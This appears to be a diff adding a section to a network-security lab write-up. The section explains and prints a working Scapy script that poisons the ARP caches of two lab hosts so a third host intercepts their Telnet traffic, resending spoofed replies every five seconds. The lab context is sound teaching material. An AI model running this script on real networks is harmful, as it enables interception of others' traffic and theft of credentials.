@@ -88,4 +88,27 @@ sendp(ethernet/arp)
 ![grat-arp](https://user-images.githubusercontent.com/126002808/220428701-fd8a00ac-fefd-46bf-a947-6e7438630782.png)
 
 
+# MITM Attack on Telnet using ARP Cache Poisoning
+
+The below script is conducting an ARP cache poisoning attack on both Host A and Host B. It sends out ARP reply packets spoofing Host M's MAC address as the MAC address for both Host A and Host B. This will cause Host A to associate Host M's MAC address with Host B's IP address and cause Host B to associate Host M's MAC address with Host A's IP address. As a result, all the packets sent between Host A and Host B will be intercepted by Host M. The while True loop sends the spoofed ARP packets every 5 seconds to ensure that the ARP cache of both Host A and Host B continues to be poisoned.
+
+```
+#!/usr/bin/env python3 
+from scapy.all import * 
+# Set the target IP addresses  
+target_a_ip = '10.9.0.5' 
+target_b_ip = '10.9.0.6' 
+# Set the MAC addresses for Hosts A, B, and M 
+host_a_mac = '02:42:0a:09:00:05' 
+host_b_mac = '02:42:0a:09:00:06' 
+host_m_mac = '02:42:0a:09:00:69' 
+# Create the ARP reply packets 
+arp_a = ARP(op=2, hwsrc=host_m_mac, psrc=target_b_ip, hwdst=host_a_mac, pdst=target_a_ip)  
+arp_b = ARP(op=2, hwsrc=host_m_mac, psrc=target_a_ip, hwdst=host_b_mac, pdst=target_b_ip) 
+# Send the packets continuously every 5 seconds 
+while True: 
+       send(arp_a) 
+       send(arp_b) 
+       time.sleep(5) 
+```
 
